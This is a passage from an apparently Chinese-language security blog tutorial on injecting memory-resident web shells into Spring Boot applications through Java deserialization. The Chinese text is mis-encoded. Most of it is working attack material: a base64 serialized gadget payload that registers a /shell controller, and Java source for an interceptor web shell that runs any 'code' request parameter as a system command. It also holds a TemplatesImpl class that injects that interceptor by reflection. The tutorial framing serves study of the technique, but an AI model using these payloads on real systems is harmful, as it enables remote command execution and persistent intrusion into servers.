Fnd0NFQVFBVGFtRjJZUzlzWVc1bkwwVjRZMlZ3ZEdsdmJnRUFPVzl5Wnk5amJHOTNiaTl6Y0hKcGJtZGliMjkwYldWdGIzSjVjMmhsYkd3dlkyOXVkRzl5Ykd4bGNpOVVaWE4wUTI5dWRISnZiR3hsY2dFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRQkFCTnFZWFpoTDJsdkwxQnlhVzUwVjNKcGRHVnlBUUFsYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnhkV1Z6ZEFFQURHZGxkRkJoY21GdFpYUmxjZ0VBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQW1hbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WemNHOXVjMlVCQUFsblpYUlhjbWwwWlhJQkFCY29LVXhxWVhaaEwybHZMMUJ5YVc1MFYzSnBkR1Z5T3dFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBdG5aWFJRY205d1pYSjBlUUVBQzNSdlRHOTNaWEpEWVhObEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFoamIyNTBZV2x1Y3dFQUd5aE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFdnRUFGaWhiVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBVnpkR0Z5ZEFFQUZTZ3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUIyaGhjMDVsZUhRQkFBTW9LVm9CQUFSdVpYaDBBUUFGWTJ4dmMyVUJBQVYzY21sMFpRRUFGU2hNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVmdFQUJXWnNkWE5vQVFBSmMyVnVaRVZ5Y205eUFRQUVLRWtwVmdBaEFDQUFJUUFBQUFBQUFnQUJBQ0lBSXdBQkFDUUFBQUF2QUFFQUFRQUFBQVVxdHdBQnNRQUFBQUlBSlFBQUFBWUFBUUFBQUEwQUpnQUFBQXdBQVFBQUFBVUFKd0FvQUFBQUFRQXBBQ29BQWdBa0FBQUJxQUFHQUFnQUFBQ3pLeElDdVFBREFnQk9MTGtBQkFFQU9nUXR4Z0NURWdVNkJSSUd1QUFIdGdBSUVnbTJBQXFaQUNHN0FBdFpCcjBBREZrREVnMVRXUVFTRGxOWkJTMVR0d0FQT2dhbkFCNjdBQXRaQnIwQURGa0RFaEJUV1FRU0VWTlpCUzFUdHdBUE9nYTdBQkpaR1FhMkFCTzJBQlMzQUJVU0ZyWUFGem9IR1FlMkFCaVpBQXNaQjdZQUdhY0FCUmtGT2dVWkI3WUFHaGtFR1FXMkFCc1pCTFlBSEJrRXRnQWRwd0FNTEJFQmxMa0FIZ0lBcHdBRVRyRUFBUUFBQUs0QXNRQWZBQU1BSlFBQUFFb0FFZ0FBQUJBQUNRQVJBQkVBRWdBVkFCTUFHUUFWQUNrQUZnQkhBQmdBWWdBYkFIZ0FIQUNNQUIwQWtRQWVBSmdBSHdDZEFDQUFvZ0FoQUtVQUlnQ3VBQ1lBc1FBa0FMSUFKd0FtQUFBQVhBQUpBRVFBQXdBckFDd0FCZ0FaQUlrQUxRQXVBQVVBWWdCQUFDc0FMQUFHQUhnQUtnQXZBREFBQndBSkFLVUFNUUF1QUFNQUVRQ2RBRElBTXdBRUFBQUFzd0FuQUNnQUFBQUFBTE1BTkFBMUFBRUFBQUN6QURZQU53QUNBRGdBQUFBcEFBaitBRWNIQURrSEFEb0hBRG44QUJvSEFEdjhBQ1VIQUR4QkJ3QTUrQUFhK1FBSVFnY0FQUUFBUGdBQUFBa0NBRFFBQUFBMkFBQUFBUUEvQUFBQUFnQkEBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDACXAJgBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9TdHJpbmcHAJkMAJoATAwAmwCcBwCdDACeAJ8HAKAMAKEAogwAowCkAQAQamF2YS9sYW5nL09iamVjdAEAOW9yZy5jbG93bi5zcHJpbmdib290bWVtb3J5c2hlbGwuY29udG9ybGxlci5UZXN0Q29udHJvbGxlcgwApQCmDACnAKgMAKkAqgcAqwwArACtBwCuDACvALABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAEkluc3RhbmNlIGNyZWF0ZWQ6IAwAsQCyDACxALMMALQAtQcAtgwAtwC4BwC5DAC6ALsBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHALwMAL0AvgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEABi9zaGVsbAwALwC/AQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwALwDAAQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwAwQDCDADDAMQMAMUAxgEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMcAMAEAGmNvbS9jbG93bi9Db250cm9sbGVyQmVoaW5kAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAD3JlZ2lzdGVyTWFwcGluZwEAbihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbztMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOylWAQAPcHJpbnRTdGFja1RyYWNlACEALQAuAAAAAAAEAAEALwAwAAEAMQAAAC8AAQABAAAABSq3AAGxAAAAAgAyAAAABgABAAAAEQAzAAAADAABAAAABQA0ADUAAAABADYANwADADEAAAA/AAAAAwAAAAGxAAAAAgAyAAAABgABAAAALAAzAAAAIAADAAAAAQA0ADUAAAAAAAEAOAA5AAEAAAABADoAOwACADwAAAAEAAEAPQA+AAAACQIAOAAAADoAAAABADYAPwADADEAAABJAAAABAAAAAGxAAAAAgAyAAAABgABAAAAMQAzAAAAKgAEAAAAAQA0ADUAAAAAAAEAOAA5AAEAAAABAEAAQQACAAAAAQBCAEMAAwA8AAAABAABAD0APgAAAA0DADgAAABAAAAAQgAAAAgARAAwAAEAMQAAAfsACQALAAAA7BICS7sAA1m3AAQqtgAFTBIGEgcHvQAIWQMSCVNZBBIKU1kFsgALU1kGsgALU7YADE0sBLYADSy4AA62AA8HvQAQWQMSEVNZBCtTWQUDuAASU1kGK764ABJTtgATwAAITi0DvQAItgAUOgQZBAO9ABC2ABU6BbIAFrsAF1m3ABgSGbYAGhkFtgAbtgActgAduAAeEh8DuQAgAwDAACE6BrsAIlkEvQAJWQMSI1O3ACQ6B7sAJVkZBwEBAQEBAbcAJjoIGQYSJ7kAKAIAwAAnOgkttgApAzI6ChkJGQgZBRkKtgAqpwAISyq2ACyxAAEAAADjAOYAKwAEADIAAABKABIAAAAUAAMAFQAPABYAMQAXADYAGABgABkAagAaAHUAGwCPABwAnwAdALEAHgDCAB8A0AAhANgAIgDjACUA5gAjAOcAJADrACcAMwAAAHoADAADAOAARQBGAAAADwDUAEcASAABADEAsgBJAEoAAgBgAIMASwBMAAMAagB5AE0ATgAEAHUAbgBPAFAABQCfAEQAUQBSAAYAsQAyAFMAVAAHAMIAIQBVAFYACADQABMAVwBYAAkA2AALAFkASgAKAOcABABaAFsAAABcAAAAFgACAGAAgwBLAF0AAwBqAHkATQBeAAQAXwAAAAkAAvcA5gcAYAQAAQBhAAAAAgBicHQAA2FhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgAt<br></code></pre></td></tr></table></figure><p>ç„¶åä¼ ç»™æ¼æ´è·¯ç”±ï¼Œè®°å¾—urlç¼–ç ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241114161649942.png" alt="image-20241114161649942"></p><p>ç„¶åç°åœ¨å°±æ˜¯æˆåŠŸæ‰“å…¥äº†ï¼Œè¿”å›erroræ˜¯é“¾å­ååºåˆ—åŒ–çš„æ—¶å€™æŠ›å¼‚å¸¸ä½†æ˜¯ä»£ç å·²ç»æ˜¯æ‰§è¡Œäº†çš„</p><p>ç°åœ¨è®¿é—®shellè·¯ç”±å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†</p><p><img src="https://cdn.clown2024.cn/image-20241114161757835.png" alt="image-20241114161757835"></p><h2 id="ååºåˆ—åŒ–åˆ©ç”¨interceptor"><a href="#ååºåˆ—åŒ–åˆ©ç”¨Interceptor" class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨Interceptor"></a>ååºåˆ—åŒ–åˆ©ç”¨Interceptor</h2><p>è¿™é‡Œçš„åˆ©ç”¨ä¹Ÿç±»ä¼¼ï¼Œé‚£å°±èµ°ä¸€éæµç¨‹</p><p>è¦æ³¨å†Œçš„Interceptor</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TemplatesImplæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorDes</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br>            <span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(AbstractHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1A